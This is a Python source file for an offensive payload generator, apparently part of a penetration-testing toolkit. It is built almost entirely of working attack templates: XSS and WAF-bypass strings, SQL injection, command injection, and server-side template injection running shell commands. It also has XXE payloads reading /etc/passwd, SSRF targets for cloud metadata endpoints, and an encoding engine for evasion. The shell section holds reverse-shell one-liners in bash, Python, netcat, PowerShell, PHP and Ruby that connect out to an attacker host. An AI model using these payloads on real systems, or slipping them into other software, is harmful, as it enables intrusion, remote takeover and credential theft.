"""
OfSec V3 — #31 Payload Generator
==================================
Generates attack payloads for various vulnerability types with
encoding, obfuscation, and evasion techniques.

Categories:
1. XSS payloads (reflected, stored, DOM)
2. SQL injection payloads (error, blind, union, time-based)
3. Command injection payloads
4. Reverse/bind shell generators
5. Encoding/obfuscation engine
6. WAF bypass variants
7. Template injection payloads
8. Deserialization payloads
9. XXE payloads
10. SSRF payloads
"""

import base64
import hashlib
import random
import string
from typing import Optional
from urllib.parse import quote

import structlog

from app.core.telemetry import get_tracer

logger = structlog.get_logger()
tracer = get_tracer("attack.payload_gen")


class PayloadGenerator:
    """Advanced attack payload generator with encoding & obfuscation."""

    # ─── XSS Payloads ────────────────────────

    XSS_TEMPLATES = {
        "basic": [
            '<script>alert({marker})</script>',
            '"><script>alert({marker})</script>',
            "'-alert({marker})-'",
            '<img src=x onerror=alert({marker})>',
            '<svg/onload=alert({marker})>',
        ],
        "event_handlers": [
            '<body onload=alert({marker})>',
            '<input onfocus=alert({marker}) autofocus>',
            '<marquee onstart=alert({marker})>',
            '<details open ontoggle=alert({marker})>',
            '<video src onerror=alert({marker})>',
        ],
        "dom_based": [
            'javascript:alert({marker})',
            'data:text/html,<script>alert({marker})</script>',
            '#"><img src=x onerror=alert({marker})>',
        ],
        "waf_bypass": [
            '<scr<script>ipt>alert({marker})</scr</script>ipt>',
            '<<script>alert({marker});//<</script>',
            '<img """><script>alert({marker})</script>">',
            '<svg><script>alert&#40;{marker}&#41;</script></svg>',
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert({marker})>',
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({marker}) )//",
        ],
    }

    # ─── SQLi Payloads ───────────────────────

    SQLI_TEMPLATES = {
        "error_based": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--+",
            "1' ORDER BY 10--+",
        ],
        "union_based": [
            "' UNION SELECT {columns}--",
            "' UNION ALL SELECT {columns}--",
            "0 UNION SELECT {columns}--",
            "-1 UNION SELECT {columns}--",
        ],
        "blind_boolean": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='{char}'--",
            "' AND (SELECT COUNT(*) FROM {table})>0--",
        ],
        "blind_time": [
            "'; WAITFOR DELAY '0:0:{seconds}'--",
            "' AND SLEEP({seconds})--",
            "' AND pg_sleep({seconds})--",
            "1; SELECT CASE WHEN (1=1) THEN pg_sleep({seconds}) ELSE pg_sleep(0) END--",
        ],
        "waf_bypass": [
            "' /*!UNION*/ /*!SELECT*/ {columns}--",
            "' %55NION %53ELECT {columns}--",
            "' uNiOn sElEcT {columns}--",
            "' UNION%0ASELECT {columns}--",
        ],
    }

    # ─── Command Injection ───────────────────

    CMDI_TEMPLATES = {
        "unix": [
            "; {cmd}", "| {cmd}", "& {cmd}", "`{cmd}`",
            "$({cmd})", "|| {cmd}", "&& {cmd}",
            "; {cmd} #", "| {cmd} #",
            "\n{cmd}",
        ],
        "windows": [
            "& {cmd}", "| {cmd}", "&& {cmd}",
            "|| {cmd}", "\n{cmd}", "%0a{cmd}",
        ],
    }

    # ─── Shell Generators ────────────────────

    SHELL_TEMPLATES = {
        "bash_reverse": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "python_reverse": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket();s.connect((\"{host}\",{port}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc_reverse": "nc -e /bin/sh {host} {port}",
        "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
        "powershell_reverse": (
            "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\""
        ),
        "php_reverse": (
            "php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "ruby_reverse": (
            "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
    }

    # ─── SSTI Templates ─────────────────────

    SSTI_TEMPLATES = {
        "jinja2": [
            "{{{{7*7}}}}",
            "{{{{config}}}}",
            "{{{{''.__class__.__mro__[2].__subclasses__()}}}}",
            "{{% import os %}}{{{{{os.popen('{cmd}').read()}}}}}}",
        ],
        "twig": [
            "{{{{7*7}}}}",
            "{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('{cmd}')}}}}",
        ],
        "freemarker": [
            "${{7*7}}",
            '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}',
        ],
    }

    # ─── XXE Payloads ────────────────────────

    XXE_TEMPLATES = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}:{port}/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{host}:{port}/evil.dtd">%xxe;]><foo/>',
    ]

    # ─── SSRF Payloads ───────────────────────

    SSRF_TEMPLATES = [
        "http://127.0.0.1:{port}",
        "http://localhost:{port}",
        "http://0.0.0.0:{port}",
        "http://[::1]:{port}",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://2130706433:{port}",  # decimal IP for 127.0.0.1
    ]

    # ─── Encoding Engine ─────────────────────

    @staticmethod
    def encode_url(payload: str) -> str:
        return quote(payload)

    @staticmethod
    def encode_double_url(payload: str) -> str:
        return quote(quote(payload))

    @staticmethod
    def encode_base64(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def encode_hex(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def encode_unicode(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def encode_html_entities(payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def encode_octal(payload: str) -> str:
        return "".join(f"\\{oct(ord(c))[2:]}" for c in payload)

    def encode_payload(self, payload: str, encoding: str = "url") -> str:
        """Apply encoding to a payload."""
        encoders = {
            "url": self.encode_url,
            "double_url": self.encode_double_url,
            "base64": self.encode_base64,
            "hex": self.encode_hex,
            "unicode": self.encode_unicode,
            "html": self.encode_html_entities,
            "octal": self.encode_octal,
        }
        encoder = encoders.get(encoding, self.encode_url)
        return encoder(payload)

    # ─── Generator Methods ───────────────────

    def generate_xss(
        self, marker: str = "1", category: str = "basic", encode: str | None = None
    ) -> list[str]:
        """Generate XSS payloads."""
        templates = self.XSS_TEMPLATES.get(category, self.XSS_TEMPLATES["basic"])
        payloads = [t.format(marker=marker) for t in templates]
        if encode:
            payloads = [self.encode_payload(p, encode) for p in payloads]
        return payloads

    def generate_sqli(
        self, category: str = "error_based", columns: str = "NULL,NULL,NULL",
        table: str = "users", char: str = "5", seconds: int = 5,
    ) -> list[str]:
        """Generate SQL injection payloads."""
        templates = self.SQLI_TEMPLATES.get(category, self.SQLI_TEMPLATES["error_based"])
        return [
            t.format(columns=columns, table=table, char=char, seconds=seconds)
            for t in templates
        ]

    def generate_cmdi(self, cmd: str = "id", os_type: str = "unix") -> list[str]:
        """Generate command injection payloads."""
        templates = self.CMDI_TEMPLATES.get(os_type, self.CMDI_TEMPLATES["unix"])
        return [t.format(cmd=cmd) for t in templates]

    def generate_shell(self, host: str, port: int, shell_type: str = "bash_reverse") -> str:
        """Generate a reverse/bind shell payload."""
        template = self.SHELL_TEMPLATES.get(shell_type, self.SHELL_TEMPLATES["bash_reverse"])
        return template.format(host=host, port=port)

    def generate_ssti(self, engine: str = "jinja2", cmd: str = "id") -> list[str]:
        """Generate SSTI payloads."""
        templates = self.SSTI_TEMPLATES.get(engine, self.SSTI_TEMPLATES["jinja2"])
        return [t.format(cmd=cmd) for t in templates]

    def generate_xxe(self, host: str = "127.0.0.1", port: int = 8080) -> list[str]:
        """Generate XXE payloads."""
        return [t.format(host=host, port=port) for t in self.XXE_TEMPLATES]

    def generate_ssrf(self, port: int = 80) -> list[str]:
        """Generate SSRF payloads including cloud metadata endpoints."""
        return [t.format(port=port) for t in self.SSRF_TEMPLATES]

    def generate_all(self, config: dict | None = None) -> dict:
        """Generate a comprehensive payload set."""
        with tracer.start_as_current_span("payload_generation"):
            cfg = config or {}
            result = {
                "xss": {
                    cat: self.generate_xss(category=cat)
                    for cat in self.XSS_TEMPLATES
                },
                "sqli": {
                    cat: self.generate_sqli(category=cat)
                    for cat in self.SQLI_TEMPLATES
                },
                "cmdi": {
                    "unix": self.generate_cmdi(os_type="unix"),
                    "windows": self.generate_cmdi(cmd="whoami", os_type="windows"),
                },
                "ssti": {
                    eng: self.generate_ssti(engine=eng)
                    for eng in self.SSTI_TEMPLATES
                },
                "ssrf": self.generate_ssrf(),
            }

            total = sum(
                len(v) if isinstance(v, list) else sum(len(sv) for sv in v.values())
                for v in result.values()
            )

            logger.info("attack.payload.generated", total_payloads=total)
            return {"total_payloads": total, "payloads": result}
